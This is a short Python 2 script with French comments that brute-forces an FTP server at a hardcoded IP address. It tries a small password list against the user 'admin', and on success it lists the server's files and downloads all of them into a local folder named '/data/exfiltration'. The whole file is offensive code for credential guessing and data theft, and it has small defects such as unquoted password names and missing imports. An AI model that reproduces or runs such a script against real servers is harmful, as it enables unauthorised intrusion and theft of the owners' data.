passwords = [Admin,test]

ip = '123.168.52.76'

def bruteFTP(ip): #bruteforce FTP + récuperation de données
	storedir = "/data/exfiltration"
	ftp=FTP(ip)
	for password in passwords:
		try:
			ftp.login("admin", password)
			print "FTP PWND"
		except:
			print "mot de passe incorrect"
			continue
		
		print "énumération des fichiers présents sur le ftp"
		try:
			files = ftp.nlst()
			for i,v in enumerate(files,1):
				print i,"->",v
			print ""
		except:
			print "erreur du listing des fichiers FTP"
			break
			
		try:
			currdir=os.getcwd()
			for j in range(len(files)):
				os.chdir(storedir)
				print "telechargement de =>",files[j]
				fhandle = open(files[j], 'wb')
				ftp.retrbinary('RETR ' + files[j], fhandle.write)
				fhandle.close()
			os.chdir(currdir)
			ftp.quit()
			break
		except:
			print "ereur de telechargement // commande RETR non présente sur le serveur ftp ?"
			break
